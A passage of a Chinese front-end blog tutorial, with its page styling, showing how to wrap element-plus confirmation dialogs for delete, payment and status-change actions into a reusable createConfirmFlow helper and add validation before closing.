cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">业务背景</h2>
<blockquote>
<p>我们做后台管理系统的时候，通常会有很多重复的页面逻辑，重复的控制流程需要做，最常见的例子应该便是确认删除。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a52011b19e047c3bef660b4437a07e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=V%2BNGGDuV9YSwzCLdnah4vmwkS7g%3D" alt="eIMScreenShot20251106150026855.jpg" loading="lazy"/></p>
<h3 data-id="heading-1">基本使用</h3>
<p>以 <code>element-plus</code> 举例，大家通常都是直接使用：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDelete</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"确定要删除这条数据吗?"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"请求参数："</span>, id);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"删除成功"</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

</code></pre>
<h3 data-id="heading-2">重复冗余代码</h3>
<p>这种方式乍一看没啥问题，但在实际业务开发中，并不是只有一个删除的业务流程。也许还会存在 <strong>支付</strong>、<strong>发布</strong>、<strong>修改状态</strong> 等等流程确认操作。此时我们的代码也许就会演变成</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDelete</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"确定要删除这条数据吗？"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });
    
    <span class="hljs-comment">// 删除中...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePayment</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"是否确认支付当前订单？"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });
    
    <span class="hljs-comment">// 支付中...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUpdateStatus</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"是否确认修改当前数据状态？"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });
    
    <span class="hljs-comment">// 修改状态...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

</code></pre>
<h3 data-id="heading-3">createConfirmFlow 函数封装</h3>
<p>写到这里大家就会发现，整个项目中会有大量类似这种结构的重复代码，聪明的小伙伴已经开始对这段代码进行提取封装优化了。于是会得到：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessageBox</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ElMessageBoxOptions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">CallBack</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; | <span class="hljs-built_in">void</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createConfirmFlow</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
  callback: CallBack,
  options?: ElMessageBoxOptions
</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-title class_">CallBack</span>&gt;) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(options.<span class="hljs-property">message</span>, options);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">callback</span>(...args);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    }
  };
};

</code></pre>
<blockquote>
<p>此时使用 <strong>createConfirmFlow</strong> 来创建流程处理函数就会变得无比简洁</p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 创建删除流程</span>
<span class="hljs-keyword">const</span> handleDelete = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 执行修改状态的逻辑...</span>
  },
  { <span class="hljs-attr">message</span>: <span class="hljs-string">"确定要删除这条数据吗？"</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">"提示"</span> }
);

<span class="hljs-comment">// 创建支付流程</span>
<span class="hljs-keyword">const</span> handlePayment = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 执行修改状态的逻辑...</span>
  },
  { <span class="hljs-attr">message</span>: <span class="hljs-string">"是否确认支付当前订单？"</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">"提示"</span> }
);

<span class="hljs-comment">// 创建更新状态流程</span>
<span class="hljs-keyword">const</span> handleUpdateStatus = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 执行修改状态的逻辑...</span>
  },
  { <span class="hljs-attr">message</span>: <span class="hljs-string">"是否确认修改当前数据状态？"</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">"提示"</span> }
);

</code></pre>
<h3 data-id="heading-4">业务场景思考</h3>
<p>基本使用基本上是没有什么大问题。但是在业务开发中，我习惯对业务需求做一个大致的流程梳理，以便优化自己的代码。以下是我自己的一些想法。</p>
<h4 data-id="heading-5">支付前置验证</h4>
<p>我想大多数人第一反应应该就是在流程处理函数中支付接口请求前验证一次即可，我们来试一下。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">validate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

<span class="hljs-keyword">const</span> handlePayment = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> (row) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row);

    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">validate</span>()) {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
    }

    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
  },
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`总价为 ￥188 是否确认支付？`</span>,
  }
);

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/807dc74267434dffb1584857af5834fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=PsjFmGYuDOyl%2BN7ygei2AbfbkjQ%3D" alt="动画.gif" loading="lazy"/></p>
<blockquote>
<p>我们会发现虽然验证函数确实成功拦截了后续接口请求的操作，但是确认框却关闭了。我认为这样的交互流程是比较意外的，既然是失败的话我期望的是这个确认窗口能保持显示。等待用户手动关闭即可。
当然了，这个属于小问题，大多数情况下应该是会忽略不管，每个人的看法不一。我这里只当是抛砖引玉，大家可以根据实际情况考虑。</p>
</blockquote>
<h5 data-id="heading-6">解决方案</h5>
<p>解决方案也很简单，ElMessage 为我们提供了 <strong>beforeClose</strong> 函数来处理关闭前的情况，只需要将验证函数提取到 <strong>beforeClos</strong> 中即可。</p>
